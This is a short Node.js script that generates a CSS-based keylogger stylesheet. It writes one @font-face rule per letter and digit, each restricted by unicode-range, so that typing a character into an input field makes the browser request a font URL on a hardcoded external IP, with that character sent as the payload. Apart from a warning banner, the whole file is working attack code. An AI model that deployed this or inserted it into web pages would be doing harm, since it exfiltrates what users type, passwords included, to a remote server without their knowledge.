const fs = require("fs");

// @font-face {
//     font-family: x;
//     src: url(http://13.57.38.41:3000/report?site=keylogger.font&payload=a), local("Courier New");
//     unicode-range: U+61;
// }

const staticHeadCSS = `
body::before {
    content: "You loaded keylogger.font.evil.css!";
    position: fixed;
    top: 0;
    left: 0;
    font-size: 12px;
    font-family: "Courier New", serif;
    background-color: rgba(255, 12, 82, 0.75);
    width: 100%;
    text-align: center;
    color: white;
    z-index: 999;
}`;

const staticEndCSS = `
input {
    font-family: x, sans-serif !important;
}
`;

function genFontFace(char) {
    return `@font-face{font-family: x; 
    src: url(http://13.57.38.41:3000/report?site=keylogger.font&payload=${char}), local("Courier New");
    unicode-range: U+${char.charCodeAt(0).toString(16)};}`
}

function generate(chars) {
    let outString = staticHeadCSS;
    for (let i = 0; i < chars.length; i++) {
        outString += genFontFace(chars[i]);
    }
    outString += staticEndCSS;
    fs.writeFileSync("keylogger.font.evil.css", outString);
}

generate("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_");

